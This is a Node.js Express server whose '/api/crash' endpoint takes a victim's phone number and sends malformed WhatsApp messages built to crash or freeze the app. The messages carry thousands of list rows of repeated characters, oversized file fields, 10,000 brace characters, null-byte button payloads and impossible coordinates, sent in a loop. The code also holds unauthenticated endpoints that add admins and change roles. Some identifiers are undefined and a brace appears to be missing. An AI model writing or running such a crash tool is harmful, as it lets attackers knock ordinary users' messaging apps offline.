const express = require("express");
const fs = require("fs");
const crypto = require("crypto");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static("public"));

const loadUsers = () => JSON.parse(fs.readFileSync("./users.json", "utf8"));
const saveUsers = (data) => fs.writeFileSync("./users.json", JSON.stringify(data, null, 2));

app.post("/api/add-user", (req, res) => {
  const { phone, role } = req.body;
  const users = loadUsers();
  users.push({ phone, role });
  saveUsers(users);
  res.json({ success: true, message: "User added." });
});

app.post("/api/add-admin", (req, res) => {
  const { phone } = req.body;
  const users = loadUsers();
  users.push({ phone, role: "admin" });
  saveUsers(users);
  res.json({ success: true, message: "Admin added." });
});

app.post("/api/change-role", (req, res) => {
  const { phone, newRole } = req.body;
  const users = loadUsers();
  const user = users.find(u => u.phone === phone);
  if (user) {
    user.role = newRole;
    saveUsers(users);
    res.json({ success: true, message: "Role updated." });
  } else {
    res.status(404).json({ success: false, message: "User not found." });
  }
});

// TARO FUNCTIONNYA
async function InvisibleHome(target, {}) {
    const delaymention = Array.from({ length: 9741 }, (_, r) => ({
        title: "᭯".repeat(9741),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                fileLength: "999999999",
                pageCount: 0x9184e729fff,
                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                fileName: "Wkwk.",
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173",
                contactVcard: true,
              },
                        }
                    },
                    description: "( ♰ )"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await zephy.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { is_status_mention: "⃔ Frezee Function 🎵‌", },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
}

async function EmpireUltimate(target, {}) {
  for (let i = 0; i < 15; i++) {
    const msg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                hasMediaAttachment: false,
                liveLocationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 922.9999,
                  name: "Matrix",
                  address: "Matrix"
                }
              },
              body: {
                text: "( 👾 ) AcistàMatr¡x505¿"
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(10000),
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "\u0000".repeat(999)
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "\u0000".repeat(999)
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "\u0000".repeat(999)
                  },
                  {
     name: "payment_status",
     buttonParamsJson: "\u0003"
       },
                ]
              },
              contextInfo: {
                remoteJid: "status@broadcast",
                participant: target,
                forwardingScore: 250208,
                isForwarded: false,
                mentionedJid: [target, "13135550002@s.whatsapp.net"]
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              }
            }
          }
        }
      },
      {}
    );

    await Empire.relayMessage(target, msg.message, {
      participant: { jid: target },
      messageId: msg.key.id
    });
console.log("EtteckTic Force")
  }
//BATES FUNCTIONNYA

app.post("/api/crash", async (req, res) => {
  const { target } = req.body;
  if (!target) {
    return res.status(400).json({ success: false, message: "Target number is required." });
  }

  try {
    await InvisibleHome(target, {});
    await EmpireUltimate(target, {}); // Dummy sock untuk testing lokal //InvisibleHome ubah ke nama asyn functionnya
    res.json({ success: true, message: `Bug terkirim ke ${target}` });
  } catch (err) {
    res.status(500).json({ success: false, message: "Gagal kirim bug", error: err.message });
  }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
